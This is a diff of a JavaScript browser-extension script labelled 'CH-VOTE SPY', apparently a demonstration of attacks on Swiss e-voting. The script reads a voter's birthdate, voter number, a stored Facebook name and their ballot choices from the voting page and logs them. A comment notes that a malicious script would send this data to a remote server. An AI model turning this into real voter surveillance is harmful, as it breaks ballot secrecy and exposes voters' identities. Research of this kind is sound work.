@@ -1,12 +1,4 @@
-document.body.style.border = "5px solid red";
-
-/**
- * Determine whether the spy script should run on this page.
- */
-function shouldRun() {
-    return window.location.href.startsWith('http://localhost:8000/evoting-confirm.html');
-    //return window.location.href.startsWith('https://www.evote-ch.ch/sg');
-}
+console.log('4_summary.js');
 
 /**
  * Extract questions and answers from voting page.
@@ -44,17 +36,21 @@ function getBirthdate() {
  * Print the gathered data.
  */
 function printData(birthdate) {
-    console.log('====== START CH-VOTE SPY ======');
-    console.log('Voter:');
-    console.log('  Born on ' + birthdate);
-    console.log('Votes:');
-    const answers = getAnswers();
-    for (const answer of answers) {
-        console.log('  ' + answer.q);
-        console.log('  -> ' + answer.a);
-    }
-    console.log('====== END CH-VOTE SPY ======');
-    console.log('(Note: At this point, a malicious script would send the data to a remote server.)');
+    browser.storage.local.get().then((keys) => {
+        console.log('====== START CH-VOTE SPY ======');
+        console.log('Voter:');
+        console.log('  Born on: ' + birthdate);
+        console.log('  Voter number: ' + localStorage.getItem('voterNumber'));
+        console.log('  Facebook name: "' + (keys.facebookName || 'unknown') + '"');
+        console.log('Votes:');
+        const answers = getAnswers();
+        for (const answer of answers) {
+            console.log('  ' + answer.q);
+            console.log('  -> ' + answer.a);
+        }
+        console.log('====== END CH-VOTE SPY ======');
+        console.log('(Note: At this point, a malicious script would send the data to a remote server.)');
+    });
 }
 
 /**
@@ -67,8 +63,7 @@ function onBirthdateChanged() {
     }
 }
 
-if (shouldRun()) {
-    document.querySelector('#n_jour_naissance').addEventListener('change', onBirthdateChanged);
-    document.querySelector('#n_mois_naissance').addEventListener('change', onBirthdateChanged);
-    document.querySelector('#n_annee_naissance').addEventListener('change', onBirthdateChanged);
-}
+document.body.style.borderTop = "10px solid red";
+document.querySelector('#n_jour_naissance').addEventListener('change', onBirthdateChanged);
+document.querySelector('#n_mois_naissance').addEventListener('change', onBirthdateChanged);
+document.querySelector('#n_annee_naissance').addEventListener('change', onBirthdateChanged);
